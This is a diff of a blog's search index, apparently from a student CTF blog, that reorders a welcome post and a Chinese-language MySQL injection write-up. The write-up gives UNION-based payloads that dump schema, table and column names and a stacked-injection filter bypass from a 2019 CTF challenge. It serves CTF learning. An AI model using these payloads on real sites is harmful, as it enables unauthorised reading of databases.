@@ -1,52 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>Hello world!</title>
-    <url>/2022/01/16/blog0000-hello-world/</url>
-    <content><![CDATA[<h2 id="写在前面的一些话"><a href="#写在前面的一些话" class="headerlink" title="写在前面的一些话"></a>写在前面的一些话</h2><p>Welcome to my blog!</p>
-<span id="more"></span>
-
-<p>这里是whistleH的博客世界，开这个博客的最初目的是大一暑假学的东西太多太杂，希望自己搭一个博客来记录一下自己学习历程。</p>
-]]></content>
-      <tags>
-        <tag>preface</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>MySQL注入的姿势</title>
-    <url>/2021/11/12/blog0002-sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/</url>
-    <content><![CDATA[<h2 id="一、联合查询"><a href="#一、联合查询" class="headerlink" title="一、联合查询"></a>一、联合查询</h2><h3 id="1、基本说明"><a href="#1、基本说明" class="headerlink" title="1、基本说明"></a>1、基本说明</h3><p>SQL注入中最经典的就是联合查询，先上经典三板斧</p>
-<p>联合注入的手段还是很多的，但是都大同小异，主要还是从information_schema这个存放mysql信息的数据库下手。</p>
-<span id="more"></span>
-
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">/</span><span class="operator">/</span>爆破库名</span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(schema_name) <span class="keyword">from</span> information_schema.schemata</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>爆破表名</span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;&#123;table_name&#125;&#x27;</span></span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>爆破列名</span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;&#123;table_name&#125;&#x27;</span></span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>爆破内容</span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="keyword">select</span> group_concat(<span class="number">0x5c</span>,<span class="keyword">column</span>,<span class="number">0x5c</span>,<span class="keyword">column</span>) <span class="keyword">from</span> &#123;database_name&#125;.&#123;table_name&#125;</span><br></pre></td></tr></table></figure>
-
-<p>联合查询是入门的SQL注入姿势，通常只有面对没有部署任何waf的Web才能奏效。</p>
-<h3 id="2、补充"><a href="#2、补充" class="headerlink" title="2、补充"></a>2、补充</h3><p>在联合查询时，我们构造payload要注意让前一个查询语句没有查询结果。</p>
-<p>这是在实际情况中，往往Web只会显示查询到的第一条信息，</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> username <span class="operator">=</span> <span class="string">&#x27;1&#x27;</span> <span class="keyword">union</span> ......</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> username <span class="operator">=</span> <span class="string">&#x27;1&#x27;</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">0</span> <span class="keyword">union</span></span><br></pre></td></tr></table></figure>
-
-<p>这里我们可以清楚发现前者屏蔽了正常查询的结果，使得我们的payload注入结果能够正常显示。</p>
-<h2 id="二、堆叠注入"><a href="#二、堆叠注入" class="headerlink" title="二、堆叠注入"></a>二、堆叠注入</h2><h3 id="1、说明"><a href="#1、说明" class="headerlink" title="1、说明"></a>1、说明</h3><p>堆叠注入的经典案例就是强网杯2019的“随便注”（XCTF和BUUOJ都有环境复现</p>
-<p>大致的原理和RCE中的管道运算符注入一样。</p>
-<h3 id="2、补充-1"><a href="#2、补充-1" class="headerlink" title="2、补充"></a>2、补充</h3><p>先上”随便注”的payload</p>
-<p>这里过滤了select 和 prepare，后者大小写非常好绕过（不用正则还是太年轻</p>
-<p>前者我们这里使用了设置变量的方法，成功绕过了select的注入问题</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">set</span> <span class="variable">@sql</span><span class="operator">=</span>concat(<span class="string">&#x27;sel&#x27;</span>,<span class="string">&#x27;ect * from `1919810931114514`&#x27;</span>);<span class="keyword">Prepare</span> uut <span class="keyword">from</span> <span class="variable">@sql</span>; <span class="keyword">execute</span> uut;  <span class="comment">-- - </span></span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <categories>
-        <category>ctf</category>
-        <category>web</category>
-        <category>sql</category>
-      </categories>
-      <tags>
-        <tag>ctf</tag>
-        <tag>web</tag>
-        <tag>sql</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>RCE中的绕过总结（持续更新中）</title>
     <url>/2021/09/14/blog0001-rce%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/</url>
     <content><![CDATA[<h2 id="一、空格绕过"><a href="#一、空格绕过" class="headerlink" title="一、空格绕过"></a>一、空格绕过</h2><h3 id="1、URL编码绕过"><a href="#1、URL编码绕过" class="headerlink" title="1、URL编码绕过"></a>1、URL编码绕过</h3><p>空格在URL编码中为%20</p>
@@ -120,6 +74,52 @@
         <tag>ctf</tag>
         <tag>web</tag>
         <tag>rce</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Hello world!</title>
+    <url>/2022/01/16/blog0000-hello-world/</url>
+    <content><![CDATA[<h2 id="写在前面的一些话"><a href="#写在前面的一些话" class="headerlink" title="写在前面的一些话"></a>写在前面的一些话</h2><p>Welcome to my blog!</p>
+<span id="more"></span>
+
+<p>这里是whistleH的博客世界，开这个博客的最初目的是大一暑假学的东西太多太杂，希望自己搭一个博客来记录一下自己学习历程。</p>
+]]></content>
+      <tags>
+        <tag>preface</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>MySQL注入的姿势</title>
+    <url>/2021/11/12/blog0002-sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/</url>
+    <content><![CDATA[<h2 id="一、联合查询"><a href="#一、联合查询" class="headerlink" title="一、联合查询"></a>一、联合查询</h2><h3 id="1、基本说明"><a href="#1、基本说明" class="headerlink" title="1、基本说明"></a>1、基本说明</h3><p>SQL注入中最经典的就是联合查询，先上经典三板斧</p>
+<p>联合注入的手段还是很多的，但是都大同小异，主要还是从information_schema这个存放mysql信息的数据库下手。</p>
+<span id="more"></span>
+
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">/</span><span class="operator">/</span>爆破库名</span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(schema_name) <span class="keyword">from</span> information_schema.schemata</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>爆破表名</span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;&#123;table_name&#125;&#x27;</span></span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>爆破列名</span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;&#123;table_name&#125;&#x27;</span></span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>爆破内容</span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="keyword">select</span> group_concat(<span class="number">0x5c</span>,<span class="keyword">column</span>,<span class="number">0x5c</span>,<span class="keyword">column</span>) <span class="keyword">from</span> &#123;database_name&#125;.&#123;table_name&#125;</span><br></pre></td></tr></table></figure>
+
+<p>联合查询是入门的SQL注入姿势，通常只有面对没有部署任何waf的Web才能奏效。</p>
+<h3 id="2、补充"><a href="#2、补充" class="headerlink" title="2、补充"></a>2、补充</h3><p>在联合查询时，我们构造payload要注意让前一个查询语句没有查询结果。</p>
+<p>这是在实际情况中，往往Web只会显示查询到的第一条信息，</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> username <span class="operator">=</span> <span class="string">&#x27;1&#x27;</span> <span class="keyword">union</span> ......</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> username <span class="operator">=</span> <span class="string">&#x27;1&#x27;</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">0</span> <span class="keyword">union</span></span><br></pre></td></tr></table></figure>
+
+<p>这里我们可以清楚发现前者屏蔽了正常查询的结果，使得我们的payload注入结果能够正常显示。</p>
+<h2 id="二、堆叠注入"><a href="#二、堆叠注入" class="headerlink" title="二、堆叠注入"></a>二、堆叠注入</h2><h3 id="1、说明"><a href="#1、说明" class="headerlink" title="1、说明"></a>1、说明</h3><p>堆叠注入的经典案例就是强网杯2019的“随便注”（XCTF和BUUOJ都有环境复现</p>
+<p>大致的原理和RCE中的管道运算符注入一样。</p>
+<h3 id="2、补充-1"><a href="#2、补充-1" class="headerlink" title="2、补充"></a>2、补充</h3><p>先上”随便注”的payload</p>
+<p>这里过滤了select 和 prepare，后者大小写非常好绕过（不用正则还是太年轻</p>
+<p>前者我们这里使用了设置变量的方法，成功绕过了select的注入问题</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">set</span> <span class="variable">@sql</span><span class="operator">=</span>concat(<span class="string">&#x27;sel&#x27;</span>,<span class="string">&#x27;ect * from `1919810931114514`&#x27;</span>);<span class="keyword">Prepare</span> uut <span class="keyword">from</span> <span class="variable">@sql</span>; <span class="keyword">execute</span> uut;  <span class="comment">-- - </span></span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>ctf</category>
+        <category>web</category>
+        <category>sql</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
+        <tag>web</tag>
+        <tag>sql</tag>
       </tags>
   </entry>
   <entry>
